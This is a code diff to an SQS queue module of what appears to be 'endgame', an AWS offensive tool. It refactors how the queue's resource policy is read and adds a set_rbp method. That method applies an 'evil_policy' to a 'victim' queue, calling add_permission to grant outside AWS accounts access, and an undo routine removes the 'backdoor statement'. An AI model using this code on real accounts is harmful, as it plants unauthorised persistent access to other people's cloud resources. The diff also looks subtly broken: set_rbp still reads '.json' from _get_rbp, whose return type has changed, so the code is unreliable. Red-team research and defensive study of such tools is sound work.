@@ -11,6 +11,7 @@ from endgame.shared.policy_document import PolicyDocument
 from endgame.shared.utils import get_sid_names_with_error_handling
 from endgame.shared.response_message import ResponseMessage
 from endgame.shared.list_resources_response import ListResourcesResponse
+from endgame.shared.response_message import ResponseGetRbp
 
 logger = logging.getLogger(__name__)
 
@@ -40,8 +41,9 @@ class SqsQueue(ResourceType, ABC):
         )
         return response.get("QueueUrl")
 
-    def _get_rbp(self) -> PolicyDocument:
+    def _get_rbp(self) -> ResponseGetRbp:
         """Get the resource based policy for this resource and store it"""
+        logger.debug("Getting resource policy for %s" % self.arn)
         queue_url = self._queue_url()
         policy = constants.get_empty_policy()
         try:
@@ -51,9 +53,11 @@ class SqsQueue(ResourceType, ABC):
             if attributes.get("Policy"):
                 policy = constants.get_empty_policy()
                 policy["Statement"].extend(json.loads(attributes.get("Policy")).get("Statement"))
+            success = True
         except botocore.exceptions.ClientError as error:
             # When there is no policy, let's return an empty policy to avoid breaking things
             logger.critical(error)
+            success = False
         policy_document = PolicyDocument(
             policy=policy,
             service=self.service,
@@ -62,10 +66,54 @@ class SqsQueue(ResourceType, ABC):
             override_resource_block=self.override_resource_block,
             override_account_id_instead_of_principal=self.override_account_id_instead_of_principal,
         )
-        return policy_document
+        response = ResponseGetRbp(policy_document=policy_document, success=success)
+        return response
+
+    def set_rbp(self, evil_policy: dict) -> ResponseMessage:
+        logger.debug("Setting resource policy for %s" % self.arn)
+        new_policy_document = PolicyDocument(
+            policy=evil_policy,
+            service=self.service,
+            override_action=self.override_action,
+            include_resource_block=self.include_resource_block,
+            override_resource_block=self.override_resource_block,
+            override_account_id_instead_of_principal=self.override_account_id_instead_of_principal,
+        )
+        new_policy_json = {
+            "Version": "2012-10-17",
+            "Statement": []
+        }
+        current_sids = get_sid_names_with_error_handling(self.original_policy)
+        try:
+            for statement in new_policy_document.statements:
+                if statement.sid not in current_sids:
+                    account_ids = []
+                    for principal in statement.aws_principals:
+                        if ":" in principal:
+                            account_ids.append(get_account_from_arn(principal))
+                    self.client.add_permission(
+                        QueueUrl=self.queue_url,
+                        Label=statement.sid,
+                        AWSAccountIds=account_ids,
+                        Actions=self.sqs_actions_without_prefixes(statement.actions)
+                    )
+                else:
+                    new_policy_json["Statement"].append(json.loads(statement.__str__()))
+            message = "success"
+            success = True
+        except botocore.exceptions.ClientError as error:
+            message = str(error)
+            success = False
+        policy_document = self._get_rbp()
+        response_message = ResponseMessage(message=message, operation="set_rbp", success=success, evil_principal="",
+                                           victim_resource_arn=self.arn, original_policy=self.original_policy,
+                                           updated_policy=policy_document.json, resource_type=self.resource_type,
+                                           resource_name=self.name, service=self.service)
+        return response_message
 
     def undo(self, evil_principal: str, dry_run: bool = False) -> ResponseMessage:
         """Wraps client.remove_permission"""
+        logger.debug(f"Removing {evil_principal} from {self.arn}")
         new_policy = constants.get_empty_policy()
         operation = "UNDO"
         message = "404: No backdoor statement found"
@@ -105,45 +153,6 @@ class SqsQueue(ResourceType, ABC):
             else:
                 updated_actions.append(action)
         return updated_actions
-
-    def set_rbp(self, evil_policy: dict) -> ResponseMessage:
-        new_policy_document = PolicyDocument(
-            policy=evil_policy,
-            service=self.service,
-            override_action=self.override_action,
-            include_resource_block=self.include_resource_block,
-            override_resource_block=self.override_resource_block,
-            override_account_id_instead_of_principal=self.override_account_id_instead_of_principal,
-        )
-        new_policy_json = {
-            "Version": "2012-10-17",
-            "Statement": []
-        }
-        current_sids = get_sid_names_with_error_handling(self.original_policy)
-        try:
-            for statement in new_policy_document.statements:
-                if statement.sid not in current_sids:
-                    account_ids = []
-                    for principal in statement.aws_principals:
-                        if ":" in principal:
-                            account_ids.append(get_account_from_arn(principal))
-                    self.client.add_permission(
-                        QueueUrl=self.queue_url,
-                        Label=statement.sid,
-                        AWSAccountIds=account_ids,
-                        Actions=self.sqs_actions_without_prefixes(statement.actions)
-                    )
-                else:
-                    new_policy_json["Statement"].append(json.loads(statement.__str__()))
-            message = "success"
-        except botocore.exceptions.ClientError as error:
-            message = str(error)
-        policy_document = self._get_rbp()
-        response_message = ResponseMessage(message=message, operation="set_rbp", evil_principal="",
-                                           victim_resource_arn=self.arn, original_policy=self.original_policy,
-                                           updated_policy=policy_document.json, resource_type=self.resource_type,
-                                           resource_name=self.name, service=self.service)
-        return response_message
 
 
 class SqsQueues(ResourceTypes):
